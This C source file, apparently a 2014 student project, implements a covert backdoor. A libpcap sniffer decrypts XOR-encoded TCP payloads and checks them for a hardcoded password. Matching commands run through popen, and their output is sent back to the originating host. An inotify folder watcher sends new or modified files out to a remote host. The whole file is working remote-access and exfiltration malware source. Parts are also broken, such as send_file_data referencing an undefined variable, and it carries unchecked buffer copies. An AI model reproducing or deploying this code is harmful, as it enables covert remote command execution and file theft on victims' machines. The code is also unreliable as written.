#include "pktcap.h"

static void set_done_flag (int);
static volatile sig_atomic_t doneflag = 0;
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: startPacketCapture
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char * src_host, int port)
-- 
-- RETURNS: 0, not important
-- 
-- NOTES: Initializes packet capture on dst port or src host
----------------------------------------------------------------------------------------------------------------------*/
int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char * src_host, int port){
	
	char nic_dev[BUFFER];		// NIC device name to monitor
	pcap_if_t *alldevs, *temp; 	// NIC list variables
    	char errbuf[PCAP_ERRBUF_SIZE]; 	// error buffer
    	bpf_u_int32 maskp;          	// subnet mask               
    	bpf_u_int32 netp;           	// ip 
    	char filter_exp[BUFFER];	// filter expression
	
    
    	/* Get all network interfaces */
    	if(pcap_findalldevs (&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error finding all devs: %s\n", errbuf);
		exit(1);
	}
	/* monitor the specified interface */
	for(temp = alldevs; temp; temp = temp->next)
	{
		if(strcmp(NETWORK_INT, temp->name) == 0)
			strcpy(nic_dev, temp->name);
	}

	if(pcap_lookupnet(nic_dev, &netp, &maskp, errbuf) < 0)
	{
		fprintf(stderr, "Error looking up IP/Netmask for device.\n");
		exit(1);
	}
	if((nic_descr = pcap_open_live(nic_dev, PKT_SIZE, 1, 500, errbuf)) == NULL)
	{
		fprintf(stderr, "Cannot open device for capturing\n");
		exit(1);	
	}
	
	/* make sure we're capturing on an Ethernet device */
	if (pcap_datalink(nic_descr) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet\n", nic_dev);
		exit(EXIT_FAILURE);
	}

	/* Compiling the filter expression */
	if(dst == FROM_CLIENT)
		sprintf(filter_exp, "tcp and dst port %d", port);
	if(dst == FROM_SERVER)	
		sprintf(filter_exp, "tcp and src host %s", src_host);	
	
	if(pcap_compile(nic_descr, &fp, filter_exp, 0, netp))
	{
		fprintf(stderr, "Cannot parse expression filter\n");
		exit(1);
	}
	/* Apply the filter to the card interface */
	if(pcap_setfilter(nic_descr, &fp) < 0)
	{
		fprintf(stderr, "Cannot set filter\n");
		exit(1);
	}

	/* Use callback to process packets */
	pcap_loop(nic_descr, -1, pkt_callback, NULL);
	return 0;
}

/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: stopPacketCapture
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int stopPacketCapture(pcap_t * nic_descr, struct bpf_program fp){
-- 
-- RETURNS: 0, not important
-- 
-- NOTES: Stops the libpcap capture loop... except the loop blocks the thread, and cant be called from other threads.
--        Should be attached to a signal handler
----------------------------------------------------------------------------------------------------------------------*/
int stopPacketCapture(pcap_t * nic_descr, struct bpf_program fp){
	pcap_freecode(&fp);
	pcap_close(nic_descr);
	return 0;
}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: pkt_callback
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const u_char* packet)
-- 
-- RETURNS: void
-- 
-- NOTES: Callback function of libpcap loop.  When packet is received, goes through this.
--        decrypts, checks for password, passes elsewhere for further processing
----------------------------------------------------------------------------------------------------------------------*/
void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const u_char* packet)
{		
	const struct ip_struct * ip;
	const struct tcp_struct * tcp;
	const unsigned char * payload;

	int size_ip;
	int size_tcp;
	int size_payload;
	int mode;
	//printf("Packet received\n");
	char password[strlen(PASSWORD) + 1];
	char * decrypted;
	char * command;

	ip = (struct ip_struct *)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip) * 4;

	if (size_ip < 20) {
		fprintf(stderr, "Invalid IP header length: %u bytes\n", size_ip);
		return;
	}

	/* print source and destination IP addresses */
	//printf("       From: %s\n", inet_ntoa(ip->ip_src));
	//printf("         To: %s\n", inet_ntoa(ip->ip_dst));

	if(ip->ip_p != IPPROTO_TCP)
		return;

	/* define/compute tcp header offset */
	tcp = (struct tcp_struct *)(packet + SIZE_ETHERNET + size_ip);
	size_tcp = TH_OFF(tcp) * 4;
	
	if (size_tcp < 20) {
		fprintf(stderr, "Invalid TCP header length: %u bytes\n", size_tcp);
		return;
	}

	/* define/compute tcp payload (segment) offset */
	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
	/* Decrypt the payload */
	iSeed(xor_key, 1);
	decrypted = xor_cipher((char *)payload, size_payload);
	
	memset(password, 0, sizeof(password));
	if(sscanf(decrypted, "%s %d", password, &mode) < 0)
	{
		fprintf(stderr, "scanning error\n");
		return;
	}

	command = parse_cmd(decrypted);

	if(mode == SERVER_MODE && (strcmp(password, PASSWORD) == 0))
	{
		fprintf(stderr, "Password Authenticated. Executing command.\n");
		process_command(command, ip, ntohs(tcp->th_sport));
		free(command);
		free(decrypted);
		return;
	}
	else if (mode == CLIENT_MODE && (strcmp(password, PASSWORD) == 0))
	{
		
		FILE* fp;
		char fileName[256];
		char* data;
		int packetMode;
		int transferMode;
		
		if(sscanf(command, "%d", &packetMode) < 0) {
			fprintf(stderr, "scanning error\n");
			return;
		}
		command +=1;
		if (packetMode == TRANSFER_MODE){
			if(sscanf(command, "%d %s", &transferMode, fileName ) < 0) {
				fprintf(stderr, "scanning error\n");
				return;
			}
			
			if (transferMode == CREATE_MODE){
			 	if( (access( fileName, 0 )) != -1 ) {
			 		char tempName[256];
			 		
			 		int count=1;
			 		sprintf(tempName, "%s%d", fileName, count);
			 		while((access( tempName, 0 )) != -1){
			 			sprintf(tempName, "%s%d", fileName, count);
			 			count++;
			 			
			 		}
					//rename(backup) old file
					rename(fileName, tempName);
					
					
				}
				
			}

			data = strstr(command, fileName) ;
			data += strlen(fileName); 
			//open file and append payload data to file
			fp = fopen(fileName, "a+");
			if(fp==NULL){fprintf(stderr, "file open error\n"); return;}
			fwrite(data, sizeof(char), strlen(data), fp);
			fclose(fp);
			
		} else if(packetMode == RESPONSE_MODE){// is command output
			//print command results to stdout
			printf("%s\n", command);
		}
		printf("%s\n", command);
		free(command);
		free(decrypted);
		return;
	}
	else
	{
		fprintf(stderr, "Incorrect Password\n");
		return;
	}

}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: parse_cmd
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: char * parse_cmd(char * data)
-- 
-- RETURNS: string of received command/text
-- 
-- NOTES: extracts data between delimiters 
----------------------------------------------------------------------------------------------------------------------*/
char * parse_cmd(char * data)
{
	char * start, * end;
	char * command = malloc((PKT_SIZE + 1) * sizeof(char));

	/* Point to the first occurance of pre-defined command string */
	start = strstr(data, CMD_START);

	/* Jump ahead past the pre-defined command string to point to the first
	   actual command character */
	start += strlen(CMD_START);

	/* Find the command end string, starting from the start pointer */
	end = strstr(start, CMD_END);

	memset(command, 0, PKT_SIZE);
	strncpy(command, start, (end - start));

	return command;
}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: process_command
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int send_command(char * command, const struct ip_struct * ip, const int dest_port)
-- 
-- RETURNS: 0 for ok, -1 for error
-- 
-- NOTES: Processes a command and gets the results.  encrypts and sends packet of results to originating host
----------------------------------------------------------------------------------------------------------------------*/
int process_command(char * command, const struct ip_struct * ip, const int dest_port)
{
	FILE *fp;

	char cmd_results[PKT_SIZE];
	char packet[PKT_SIZE];
	char src[BUFFER];
	char dst[BUFFER];

	strcpy(src, inet_ntoa(ip->ip_dst));
	strcpy(dst, inet_ntoa(ip->ip_src));

	if((fp = popen(command, "r")) == NULL)
	{
		fprintf(stderr, "Cannot process command.\n");
		return -1;
	}
	
	while(fgets(cmd_results, PKT_SIZE - 1, fp) != NULL)
	{
		cmd_results[strlen(cmd_results)-1] = '\0';
		//Format packet payload
		sprintf(packet, "%s %d %s%s%s" /* "%s %d %s%d%s%s" */, PASSWORD, CLIENT_MODE, CMD_START, /* RESPONSE_MODE,*/cmd_results, CMD_END);
		printf("Packet: %s\n", packet);
		//Encrypt payload
		
		//Send it over to the client
		iSeed(xor_key, 1);
		send_packet(xor_cipher(packet, strlen(packet)), strlen(packet), src, dst, dest_port);
		
		memset(packet, 0, sizeof(packet));
		memset(cmd_results, 0, sizeof(cmd_results));
	}
	pclose(fp);
	
	return 0;
}

int send_file_data(char * fileName, char* src_ip, char* dest_ip, const int dest_port){
	FILE* fp;
	char data[PKT_SIZE];
	int count = 0;
	int transferMode;
	
	char packet[PKT_SIZE];
	char src[BUFFER];
	char dst[BUFFER];

	strcpy(src, inet_ntoa(ip->ip_dst));
	strcpy(dst, inet_ntoa(ip->ip_src));
	
	fp = fopen(fileName, "r");
	if(fp==NULL){fprintf(stderr, "file open error."); return -1;}
	//read file
	while(fgets(data, PKT_SIZE - 10, fp) != NULL)
	{
		if(count ==0){
			transferMode = CREATE_MODE;
		}else {
			transferMode = APPEND_MODE;
		}
		
		
		//Format packet payload
		sprintf(packet, "%s %d %s%d %d %s %s%s", PASSWORD, CLIENT_MODE, CMD_START, TRANSFER_MODE, transferMode, fileName, data, CMD_END);
		printf("Packet: %s\n", packet);
		//Encrypt payload
		
		//Send it over to the client
		iSeed(xor_key, 1);
		send_packet(xor_cipher(packet, strlen(packet)), strlen(packet), src, dst, dest_port);
		
		memset(packet, 0, sizeof(packet));
		memset(data, 0, sizeof(data));
		count ++;
	}

	//
	fclose(fp);
	
	return 0;
}

int initFileMonitor(char * folder, char* src_ip, char* dest_ip, const int dest_port){
	
	int len, i, ret, fd, wd;
//	struct timeval time;
	static struct inotify_event *event;
	fd_set rfds;
	char buf[BUFFER];
	struct sigaction act;


	// time out after 10 seconds	
	//time.tv_sec = 10;
	//time.tv_usec = 0;

	fd = inotify_init();
	if (fd < 0)
		perror ("inotify_init");
	
	//wd = inotify_add_watch (fd, folder, (uint32_t)ALL_MASK);
	wd = inotify_add_watch (fd, folder, (uint32_t)IN_MODIFY|IN_CREATE|IN_DELETE);
	
	if (wd < 0)
		perror ("inotify_add_watch");

	FD_ZERO (&rfds);
	FD_SET (fd, &rfds);

	// set up the signal handler 
	act.sa_handler = set_done_flag;
	act.sa_flags = 0;
	if ((sigemptyset (&act.sa_mask) == -1 || sigaction (SIGINT, &act, NULL) == -1))
	{
		perror ("Failed to set SIGINT handler");
		exit (EXIT_FAILURE);
	}

	while (!doneflag)
	{
		ret = select (fd + 1, &rfds, NULL, NULL, NULL);
		len = read (fd, buf, BUFFER);
	
		i = 0;
		if (len < 0) 
		{
        		if (errno == EINTR) /* need to reissue system call */
				perror ("read");
        		else
                		perror ("read");
		} 
		else if (!len) /* BUF_LEN too small? */
		{
			printf ("buffer too small!\n");
			exit (1);
		}

		while (i < len) 
		{
        		//struct inotify_event *event;
        		event = (struct inotify_event *) &buf[i];

        		printf ("\nwd=%d mask=%u cookie=%u len=%u\n", event->wd, event->mask, event->cookie, event->len);
        		if (event->len)
                		printf ("name=%s\n", event->name);
        		i += EVENT_SIZE + event->len;
		}
	
		if (ret < 0)
			perror ("select");
		else if (!ret)
			printf ("timed out\n");
		else if (FD_ISSET (fd, &rfds))
		{
			if (event->mask & IN_MODIFY || event->mask & IN_CREATE){
				send_file_data(event->name, src_ip, dest_ip, dest_port);
			}


		}
	}
	
	printf ("Cleaning up and Terminating....................\n");
	fflush (stdout);
	ret = inotify_rm_watch (fd, wd);
	if (ret)
		perror ("inotify_rm_watch");
	if (close(fd))
		perror ("close");
	return 0;
}
static void set_done_flag (int signo)
{
	doneflag = TRUE;
}

